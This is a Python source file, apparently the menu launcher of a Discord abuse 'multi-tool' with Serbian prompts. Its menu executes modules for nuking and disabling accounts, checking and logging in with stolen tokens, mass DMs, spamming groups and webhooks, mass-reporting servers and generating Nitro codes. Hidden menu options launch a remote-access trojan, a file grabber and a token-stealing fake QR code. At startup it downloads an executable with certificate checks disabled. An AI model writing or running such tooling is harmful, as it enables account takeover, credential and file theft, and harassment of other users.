from shutil import ExecError
from tkinter import E
import webbrowser
from util.plugins.update import search_for_updates
from util.plugins.commun import *
import subprocess
import os

def main():
    clear()
    setTitle(f"{THIS_VERSION}")
    astraahometitle()
    print(f"""{m}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
{y}[01{y}]{m} Account Nuker       {y}[07{y}]{m} Tokens Checker   {y}[13{y}]{m} QrCode           {y}[19{y}]{m} Calculator                                    
{y}[02{y}]{m} Account Disabler    {y}[08{y}]{m} Clear DM         {y}[14{y}]{m} Webhook Spammer  {y}[20{y}]{m} Uskoro 
{y}[03{y}]{m} Ne radi             {y}[09{y}]{m} House Changer    {y}[15{y}]{m} Webhook Remover  {y}[21{y}]{m} Uskoro 
{y}[04{y}]{m} Settings Cycler     {y}[10{y}]{m} Server Lookup    {y}[16{y}]{m} ServerMassReport {y}[22{y}]{m} Uskoro 
{y}[05{y}]{m} Token Informations  {y}[11{y}]{m} Mass DM          {y}[17{y}]{m} Web Searcher     {y}[23{y}]{m} Uskoro 
{y}[06{y}]{m} AutoLogin           {y}[12{y}]{m} Group Spammer    {y}[18{y}]{m} Server Maker     {y}[24{y}]{m} Uskoro                      
{m}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════""")

    global choice   
    choice = input(f"""\n{y}>[0]{c} RateThisTool\n[--->{y}]{m} IZABERI KOMANDU: """)
    
    
    if choice == '77' or choice == '77':
        transition()
        selfbottitle()
        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} NIJE JOS NAPRAVLJENO.")
        main()       
    elif choice == '93' or choice == '93':
        transition()
        exec(open('util/2_Rat/rat.py').read())
    elif choice == '99':
        transition()
        exec(open('util/99_NewVersion/Update.py').read())
        main()  
    elif choice == '66' or choice == '66':
        transition()
        raidtitle()
        input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} NIJE JOS NAPRAVLJENO.")
        main()
    elif choice == '88' or choice == '88':
        transition()
        subprocess.call([r'util\\5_VidCrashMaker\\crashvideomaker.bat'])
    elif choice == '33' or choice == '33':
        transition()
        exec(open('util/6_FileGrab/filegrabber.py').read())
    elif choice == '100' or choice == '100':
        transition()
        imagegrabbertitle()
        input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} NIJE JOS NAPRAVLJENO.")
        main()
    elif choice == '13':
        transition()
        exec(open('util/13_TokenFakeQr/fakeqr.py').read())
    elif choice == '1'or choice == '01':
        transition()
        exec(open('util/1_AccountNuker/accountnuker.py').read())
    elif choice == '2'or choice == '02':
        transition()
        exec(open('util/2_AccountDisabler/accountdisabler.py').read())
    elif choice == '3'or choice == '03':
        transition()
        input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} NIJE JOS NAPRAVLJENO.")
        main()
    elif choice == '4'or choice == '04':
        transition()
        exec(open('util/4_SettingsCycler/settingscycler.py').read())
    elif choice == '5'or choice == '05':
        transition()
        exec(open('util/5_TokenInfo/tokeninfo.py').read())
    elif choice == '6'or choice == '06':
        transition()
        exec(open('util/6_AutoLogin/autologin.py').read())
    elif choice == '7'or choice == '07':
        transition()
        exec(open('util/7_TokensChecker/tokenschecker.py').read()) 
    elif choice == '8'or choice == '08':
        transition()
        exec(open('util/8_ClearDM/cleardm.py').read())
    elif choice == '9'or choice == '09':
        transition()
        exec(open('util/9_HouseChanger/housechanger.py').read())
    elif choice == '10':
        transition()
        exec(open('util/10_ServerLookup/serverlookup.py').read())
    elif choice == '11':
        transition()
        exec(open('util/11_MassDM/massdm.py').read())
    elif choice == '12':
        transition()
        exec(open('util/12_GroupSpammer/groupspammer.py').read())
    elif choice == '14':
            transition()
            exec(open('util/14_WebHSpam/webhspam.py').read()) 
    elif choice == '15':
        transition()
        exec(open('util/15_WebHRemover/webhremover.py').read()) 
    elif choice == '16':
        transition()
        exec(open('util/16_MassReport/MassReport.py').read()) 
    elif choice == '0':
        transition()
        exec(open('util/0_RatingMultiTool/RatingMultiTool.py').read()) 
    elif choice == '88':
        transition()
        exec(open('util/16_TokenCheker/TokenCheker.py').read())     
    if choice == '17':
        transition()
        webbrowser.open_new('https://google.com')
    elif choice == '18':
        transition()
        exec(open('util/18_ServerMaker/servermaker.py').read())
    elif choice == '19':
        os.startfile('calc.exe')

    
               
            
    elif choice == '>': 
           
        
        
        clear()
        astraahometitle()
        print(f"""      {y}[{m}+{y}]{w} Nitro Options:          {y}[{m}+{y}]{w} WebHooks Options:        {y}[{m}+{y}]{w} Other Options:
\n          {y}[{w}21{y}]{w} Generator              {y}[{w}22{y}]{w} Spammer                 {y}[{w}24{y}]{w} Credits
\n                                      {y}[{w}23{y}]{w} Remover                 {y}[{w}25{y}]{w} Exit\n\n\n\n\n\n\n\n\n\n                                                                                                     {y}[{m}<{y}]{w} Previous Page""")
        choice = input(f"""{y}[{m}#{y}]{w} IZABERI: """)
        if choice == '21':
            transition()
            exec(open('util/21_InspectNitroGen/nitrogen.py').read())
        elif choice == '24':
            transition()
            astraahometitle()
            print(f"""                                            {y}[{m}+{y}]{w} DEVELOPMENT ᲼᲼᲼#1208:\n\n""")
            input(f"""{y}[--->{y}]{m} PRITISNI ENTER ZA EXIT""")
            main()
        elif choice == '25':
            transition()
            sys.exit()
        elif choice == '<':
            clear()
            main()    
        else:
            clear()
            main()
    else:
        clear()
        main()


if __name__ == "__main__":
    import sys
    setTitle("{c}LOADING...")
    
    System.Size(120, 30)
    Anime.Fade(Center.Center(banner), Colors.purple_to_blue, Colorate.Vertical, time=1)
    if not os.path.exists("output"):
        os.makedirs("output", exist_ok=True)
    if os.path.exists("output/QR-Code"):
        shutil.rmtree(f"output/QR-Code")
    os.system("""if not exist "util/chromedriver.exe" echo [#] Downloading chromedriver: """)
    os.system("""if not exist "util/chromedriver.exe" curl -#fkLo "util/chromedriver.exe" "https://github.com/Inspect/inspectcrome/raw/main/chromedriver.exe" """)
    if os.path.basename(sys.argv[0]).endswith("exe"):
        search_for_updates()
        if not os.path.exists(getTempDir()+"\\atio_proxies"):
            proxy_scrape()
        clear()
        main()
    try:
        assert sys.version_info >= (3,9)
    except AssertionError:
        input(f"{y}[{Fore.RED}#{y}]{w} YOUR VERSION ITS NOT GOOD ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}) DOWNLOAD PYTO 3.10 OR MORE!")
        sys.exit()
    else:
        search_for_updates()
        if not os.path.exists(getTempDir()+"\\atio_proxies"):
            proxy_scrape()
        clear()
        main()
